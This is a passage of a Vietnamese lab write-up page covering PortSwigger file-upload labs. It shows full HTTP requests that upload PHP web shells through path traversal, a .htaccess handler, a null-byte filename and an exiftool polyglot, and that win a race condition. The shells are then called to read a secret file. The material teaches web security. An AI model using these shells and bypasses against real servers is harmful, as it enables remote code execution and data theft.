+<p>Mặc dù, chúng ta upload thành công thì chúng ta vẫn chỉ nhận lại plain text mà code không thực thi</p>
+<p><img alt="image.png" src="image%209.png" /></p>
+</li>
+<li>
+<p>Tuy nhiên, tại chức năng upload file có lỗi path traversal → thử upload ở thư mục cho phép file được thực thi</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /my-account/avatar HTTP/2</span>
+<span class="x">Host: 0a9000320447c7f8818789a100cd005c.web-security-academy.net</span>
+<span class="x">Cookie: session=XsdPw8VeEafilI8v7A1LPtLmPTHq686F</span>
+<span class="x">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0</span>
+<span class="x">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="x">Accept-Language: en-US,en;q=0.9</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Content-Type: multipart/form-data; boundary=----geckoformboundaryd218eeb73cc709158f9edb40eafa251e</span>
+<span class="x">Content-Length: 523</span>
+<span class="x">Origin: https://0a9000320447c7f8818789a100cd005c.web-security-academy.net</span>
+<span class="x">Referer: https://0a9000320447c7f8818789a100cd005c.web-security-academy.net/my-account</span>
+<span class="x">Upgrade-Insecure-Requests: 1</span>
+<span class="x">Sec-Fetch-Dest: document</span>
+<span class="x">Sec-Fetch-Mode: navigate</span>
+<span class="x">Sec-Fetch-Site: same-origin</span>
+<span class="x">Sec-Fetch-User: ?1</span>
+<span class="x">Priority: u=0, i</span>
+<span class="x">Te: trailers</span>
+
+<span class="x">------geckoformboundaryd218eeb73cc709158f9edb40eafa251e</span>
+<span class="x">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;..%2f1772433842_a.php&quot;</span>
+<span class="x">Content-Type: application/x-php</span>
+
+<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+<span class="x">------geckoformboundaryd218eeb73cc709158f9edb40eafa251e</span>
+<span class="x">Content-Disposition: form-data; name=&quot;user&quot;</span>
+
+<span class="x">wiener</span>
+<span class="x">------geckoformboundaryd218eeb73cc709158f9edb40eafa251e</span>
+<span class="x">Content-Disposition: form-data; name=&quot;csrf&quot;</span>
+
+<span class="x">q7TvlQuePGWpCcyGYLHGhikGvmJa9S7B</span>
+<span class="x">------geckoformboundaryd218eeb73cc709158f9edb40eafa251e--</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2010.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện submit secret. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+</li>
+</ul>
+<h1 id="lab-web-shell-upload-via-extension-blacklist-bypass"><strong>Lab: Web shell upload via extension blacklist bypass</strong><a class="headerlink" href="#lab-web-shell-upload-via-extension-blacklist-bypass" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass">Lab: Web shell upload via extension blacklist bypass | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Cách web server xử lý khi gặp file php đó là sẽ có 1 handler, nó sẽ tìm xem extension đó sẽ cho handler nào xử lý (ví dụ PHP thì chuyển cho PHP engine, …). File <code>httpd.conf</code> của apache hoặc <code>nginx.conf</code> , <code>.htaccess</code> . Ví dụ đây là cách cấu hình <code>.htaccess</code> để thêm handler</p>
+<div class="highlight"><pre><span></span><code>AddHandler<span class="w"> </span>application/x-httpd-php<span class="w"> </span>.html
+</code></pre></div>
+</li>
+<li>
+<p>Trong bài này, chúng ta bị chặn mọi dạng file php → nhưng file khác thì upload tự do. Như vậy chúng ta có thể upload file <code>.htaccess</code> và thêm handler cho extension bất kỳ mà upload thành công.</p>
+</li>
+<li>
+<p>Trước hết, Trước hết, login với tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng <code>My account &gt; Avatar &gt; Upload</code> . Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /my-account/avatar</code> và chuyển sang tab Repeater. Tại đây, thực hiện upload file php bằng request sau: thực hiện upload <code>.htaccess</code> với request sau:</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /my-account/avatar HTTP/2</span>
+<span class="x">Host: 0a8600350493bb19805cee8a00cc00cf.web-security-academy.net</span>
+<span class="x">Cookie: session=8c44O6r5k16Kqo3JSPStxDdw4ULnjiWt</span>
+<span class="x">User-Agent: admin</span>
+<span class="x">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="x">Accept-Language: en-US,en;q=0.9</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Referer: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net/my-account?id=wiener</span>
+<span class="x">Content-Type: multipart/form-data; boundary=----geckoformboundary42b54b7e8bbdae772ff9c35b338138ae</span>
+<span class="x">Content-Length: 504</span>
+<span class="x">Origin: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net</span>
+<span class="x">Upgrade-Insecure-Requests: 1</span>
+<span class="x">Sec-Fetch-Dest: document</span>
+<span class="x">Sec-Fetch-Mode: navigate</span>
+<span class="x">Sec-Fetch-Site: same-origin</span>
+<span class="x">Sec-Fetch-User: ?1</span>
+<span class="x">Priority: u=0, i</span>
+<span class="x">Te: trailers</span>
+
+<span class="x">------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae</span>
+<span class="x">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;.htaccess&quot;</span>
+<span class="x">Content-Type: image/png</span>
+
+<span class="x">AddHandler application/x-httpd-php .xxxx</span>
+<span class="x">------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae</span>
+<span class="x">Content-Disposition: form-data; name=&quot;user&quot;</span>
+
+<span class="x">wiener</span>
+<span class="x">------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae</span>
+<span class="x">Content-Disposition: form-data; name=&quot;csrf&quot;</span>
+
+<span class="x">KkPoHayfXmgfVPNaBQ8mVKPPNGyFR23g</span>
+<span class="x">------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae--</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2012.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó, thực hiện upload 1 file extension <code>.xxxx</code> bằng request sau:</p>
+<ul>
+<li>
+<p>Request:</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /my-account/avatar HTTP/2</span>
+<span class="x">Host: 0a8600350493bb19805cee8a00cc00cf.web-security-academy.net</span>
+<span class="x">Cookie: session=8c44O6r5k16Kqo3JSPStxDdw4ULnjiWt</span>
+<span class="x">User-Agent: admin</span>
+<span class="x">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="x">Accept-Language: en-US,en;q=0.9</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Referer: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net/my-account?id=wiener</span>
+<span class="x">Content-Type: multipart/form-data; boundary=----geckoformboundary42b54b7e8bbdae772ff9c35b338138ae</span>
+<span class="x">Content-Length: 489</span>
+<span class="x">Origin: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net</span>
+<span class="x">Upgrade-Insecure-Requests: 1</span>
+<span class="x">Sec-Fetch-Dest: document</span>
+<span class="x">Sec-Fetch-Mode: navigate</span>
+<span class="x">Sec-Fetch-Site: same-origin</span>
+<span class="x">Sec-Fetch-User: ?1</span>
+<span class="x">Priority: u=0, i</span>
+<span class="x">Te: trailers</span>
+
+<span class="x">------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae</span>
+<span class="x">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;a.xxxx&quot;</span>
+<span class="x">Content-Type: image/png</span>
+
+<span class="cp">&lt;?php</span>  <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;a&quot;</span><span class="p">]);</span><span class="cp">?&gt;</span>
+<span class="x">------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae</span>
+<span class="x">Content-Disposition: form-data; name=&quot;user&quot;</span>
+
+<span class="x">wiener</span>
+<span class="x">------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae</span>
+<span class="x">Content-Disposition: form-data; name=&quot;csrf&quot;</span>
+
+<span class="x">KkPoHayfXmgfVPNaBQ8mVKPPNGyFR23g</span>
+<span class="x">------geckoformboundary42b54b7e8bbdae772ff9c35b338138ae--</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2013.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request sau để RCE và đọc secret</p>
+<ul>
+<li>
+<p>Request:</p>
+<div class="highlight"><pre><span></span><code><span class="x">GET /files/avatars/a.xxxx?a=cat%20%2fhome%2fcarlos%2fsecret HTTP/2</span>
+<span class="x">Host: 0a8600350493bb19805cee8a00cc00cf.web-security-academy.net</span>
+<span class="x">Cookie: session=8c44O6r5k16Kqo3JSPStxDdw4ULnjiWt</span>
+<span class="x">User-Agent: admin</span>
+<span class="x">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="x">Accept-Language: en-US,en;q=0.9</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Referer: https://0a8600350493bb19805cee8a00cc00cf.web-security-academy.net/my-account</span>
+<span class="x">Upgrade-Insecure-Requests: 1</span>
+<span class="x">Sec-Fetch-Dest: document</span>
+<span class="x">Sec-Fetch-Mode: navigate</span>
+<span class="x">Sec-Fetch-Site: same-origin</span>
+<span class="x">If-Modified-Since: Tue, 24 Mar 2026 08:20:47 GMT</span>
+<span class="x">If-None-Match: &quot;62b-64dc0d4155e51&quot;</span>
+<span class="x">Priority: u=0, i</span>
+<span class="x">Te: trailers</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2014.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Submit secret và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2015.png" /></p>
+</li>
+</ul>
+<h1 id="lab-web-shell-upload-via-obfuscated-file-extension"><strong>Lab: Web shell upload via obfuscated file extension</strong><a class="headerlink" href="#lab-web-shell-upload-via-obfuscated-file-extension" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension">Lab: Web shell upload via obfuscated file extension | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, login với tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng <code>My account &gt; Avatar &gt; Upload</code> . Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /my-account/avatar</code> và chuyển sang tab Repeater. Tại đây, thực hiện upload file php bằng request sau:</p>
+<div class="highlight"><pre><span></span><code><span class="x">POST /my-account/avatar HTTP/2</span>
+<span class="x">Host: 0adb007e045fe7a0823ca684004e0088.web-security-academy.net</span>
+<span class="x">Cookie: session=ysriazlinFFujGqkTr375IclT5Z1nfq2</span>
+<span class="x">User-Agent: admin</span>
+<span class="x">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="x">Accept-Language: en-US,en;q=0.9</span>
+<span class="x">Accept-Encoding: gzip, deflate, br</span>
+<span class="x">Referer: https://0adb007e045fe7a0823ca684004e0088.web-security-academy.net/my-account?id=wiener</span>
+<span class="x">Content-Type: multipart/form-data; boundary=----geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb</span>
+<span class="x">Content-Length: 496</span>
+<span class="x">Origin: https://0adb007e045fe7a0823ca684004e0088.web-security-academy.net</span>
+<span class="x">Upgrade-Insecure-Requests: 1</span>
+<span class="x">Sec-Fetch-Dest: document</span>
+<span class="x">Sec-Fetch-Mode: navigate</span>
+<span class="x">Sec-Fetch-Site: same-origin</span>
+<span class="x">Sec-Fetch-User: ?1</span>
+<span class="x">Priority: u=0, i</span>
+<span class="x">Te: trailers</span>
+
+<span class="x">------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb</span>
+<span class="x">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;abc.php%00.jpg&quot;</span>
+<span class="x">Content-Type: image/png</span>
+
+<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
+<span class="x">------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb</span>
+<span class="x">Content-Disposition: form-data; name=&quot;user&quot;</span>
+
+<span class="x">wiener</span>
+<span class="x">------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb</span>
+<span class="x">Content-Disposition: form-data; name=&quot;csrf&quot;</span>
+
+<span class="x">lML5bRHpcvZICkjkKNZGHwcfiBqwkDup</span>
+<span class="x">------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb--</span>
+</code></pre></div>
+</li>
+<li>
+<p>Ở đây, chúng ta dùng null byte. Trường hợp có thể bypass được bằng cách này đó là khi hàm validate viết bằng PHP hoặc Java nhưng server xử lý bằng ngôn ngữ bậc thấp hơn như C/C++</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>POST /my-account/avatar HTTP/2
+Host: 0adb007e045fe7a0823ca684004e0088.web-security-academy.net
+Cookie: session=ysriazlinFFujGqkTr375IclT5Z1nfq2
+User-Agent: admin
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://0adb007e045fe7a0823ca684004e0088.web-security-academy.net/my-account?id=wiener
+Content-Type: multipart/form-data; boundary=----geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
+Content-Length: 496
+Origin: https://0adb007e045fe7a0823ca684004e0088.web-security-academy.net
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
+Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;abc.php%00.jpg&quot;
+Content-Type: image/png
+
+<span class="cp">&lt;?php system($_GET[&#39;a&#39;]);?&gt;</span>
+------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
+Content-Disposition: form-data; name=&quot;user&quot;
+
+wiener
+------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb
+Content-Disposition: form-data; name=&quot;csrf&quot;
+
+lML5bRHpcvZICkjkKNZGHwcfiBqwkDup
+------geckoformboundary5b8a17ae709283b3ccfa43ab353b29fb--
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2016.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Kết quả đọc secret. Thực hiện submit hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2017.png" /></p>
+<p><img alt="image.png" src="image%2018.png" /></p>
+</li>
+</ul>
+<h1 id="lab-remote-code-execution-via-polyglot-web-shell-upload"><strong>Lab: Remote code execution via polyglot web shell upload</strong><a class="headerlink" href="#lab-remote-code-execution-via-polyglot-web-shell-upload" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload">Lab: Remote code execution via polyglot web shell upload | Web Security Academy</a></p>
+<ul>
+<li>Trước hết, login với tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng <code>My account &gt; Avatar &gt; Upload</code> . Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /my-account/avatar</code> và chuyển sang tab Repeater.</li>
+<li>Ở bài lab này, chúng ta có thể upload file extension php nhưng với nội dung là file png, jpeg. Vì vậy chúng ta có thể tạo file polygot với chèn thêm payload, sau đó upload file với extension php để thực thi.</li>
+<li>
+<p>Trước hết, tạo file polygot với Exiftool bằng command sau:</p>
+<ul>
+<li>
+<p>Command</p>
+<div class="highlight"><pre><span></span><code>exiftool.exe -Comment=&quot;<span class="cp">&lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt;</span>&quot; content.png -o mal1.png
+    1 image files created
+</code></pre></div>
+</li>
+<li>
+<p>Cấu trúc thư mục như sau</p>
+<p><img alt="image.png" src="image%2019.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện upload ảnh <code>mal1.png</code> , trong phần mềm Burpsuite, bắt request gửi tới API <code>POST /my-account/avatar</code> , chỉnh sửa extension file upload thành <code>php</code> như sau:</p>
+<p><img alt="image.png" src="image%2020.png" /></p>
+</li>
+<li>
+<p>Thực hiện gửi request sau để RCE và đọc file</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>GET /files/avatars/mal1.php?cmd=cat%20%2fhome%2fcarlos%2fsecret HTTP/2
+Host: 0a5000a804b8747886decb15005000d8.web-security-academy.net
+Cookie: session=ChumR2bUgi0N8V6ttretf3PmuDsIYqzJ
+User-Agent: admin
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2021.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Submit secret, hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2022.png" /></p>
+</li>
+</ul>
+<h1 id="lab-web-shell-upload-via-race-condition"><strong>Lab: Web shell upload via race condition</strong><a class="headerlink" href="#lab-web-shell-upload-via-race-condition" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition">Lab: Web shell upload via race condition | Web Security Academy</a></p>
+<ul>
+<li>Trước hết, bài này có thể code backend xử lý theo cách đó là vẫn cho phép lưu file ra file system, sau đó mới check nếu file không hợp lệ thì mới xóa → như vậy quãng kiểm tra ở giữa chúng ta vẫn có thể access file → race condition</li>
+<li>Thực hiện login bằng tài khoản <code>wiener:peter</code> . Thực hiện điều hướng đến chức năng <code>My-account</code> . Tại đây, thực hiện upload avatar. Tuy nhiên ở đây đã có cơ chế chặn upload file khác <code>png, jpg</code> và không thể khai thác bằng cách thêm null byte, đổi mime-type,…</li>
+<li>
+<p>Thực hiện ý tưởng ở đầu, chúng ta sẽ thực hiện race condition như sau:</p>
+<ul>
+<li>
+<p>Request upload file</p>
+<div class="highlight"><pre><span></span><code>POST /my-account/avatar HTTP/2
+Host: 0a2800260467fb43812d07d00093007a.web-security-academy.net
+Cookie: session=wBCq62PmWy41kNmEKQEQLufU27jtpqMF
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=----geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed
+Content-Length: 521
+Origin: https://0a2800260467fb43812d07d00093007a.web-security-academy.net
+Referer: https://0a2800260467fb43812d07d00093007a.web-security-academy.net/my-account
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+------geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed
+Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;1772433743_a.php&quot;
+Content-Type: application/x-php
+
+<span class="cp">&lt;?php system(&quot;cat /home/carlos/secret&quot;);?&gt;</span>
+------geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed
+Content-Disposition: form-data; name=&quot;user&quot;
+
+wiener
+------geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed
+Content-Disposition: form-data; name=&quot;csrf&quot;
+
+SwpBNmWRYnWjpLzMu2DumdCIGM0Vrtxj
+------geckoformboundary2ae16990317e4e9dd5d1f2f723c1bfed--
+</code></pre></div>
+</li>
+<li>
+<p>Khi thực hiện upload file hợp lệ, server trả về đường dẫn file</p>
+<p><img alt="image.png" src="image%2023.png" /></p>
+</li>
+<li>
+<p>Như vậy, chúng ta có thể thực hiện gọi file php upload trước khi nó bị xóa bằng request sau:</p>
+<div class="highlight"><pre><span></span><code>GET /files/avatars/1772433743_a.php HTTP/2
+Host: 0a2800260467fb43812d07d00093007a.web-security-academy.net
+Cookie: session=wBCq62PmWy41kNmEKQEQLufU27jtpqMF
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a2800260467fb43812d07d00093007a.web-security-academy.net/my-account
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+If-Modified-Since: Tue, 24 Mar 2026 03:10:34 GMT
+If-None-Match: &quot;fb54-64dbc7eab2589&quot;
+Priority: u=0, i
+Te: trailers
+</code></pre></div>
+</li>
+<li>
+<p>Thực hiện gửi song song các request trên bằng chế độ <code>Send parallel</code> trong Repeater</p>
+<p><img alt="image.png" src="image%2024.png" /></p>
+</li>
+<li>
+<p>Quan sát thấy có reponse trả về secret → thực hiện submit và hoàn thành việc giải lab</p>
+<p><img alt="image.png" src="image%2025.png" /></p>
+<p><img alt="image.png" src="image%2026.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Code phía backend có thể như này</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&quot;files/avatars/&quot;</span><span class="p">;</span>
+<span class="nv">$upload_ok</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;avatar&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
+    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;avatar&quot;</span><span class="p">][</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">],</span> <span class="nv">$target_file</span><span class="p">))</span> <span class="p">{</span>      
+        <span class="nv">$image_info</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$image_info</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+
+            <span class="nb">unlink</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">);</span> 
+            <span class="k">echo</span> <span class="s2">&quot;Lỗi: File không phải là ảnh hợp lệ và đã bị xóa.&quot;</span><span class="p">;</span>
+            <span class="nv">$upload_ok</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&quot;Upload thành công!&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
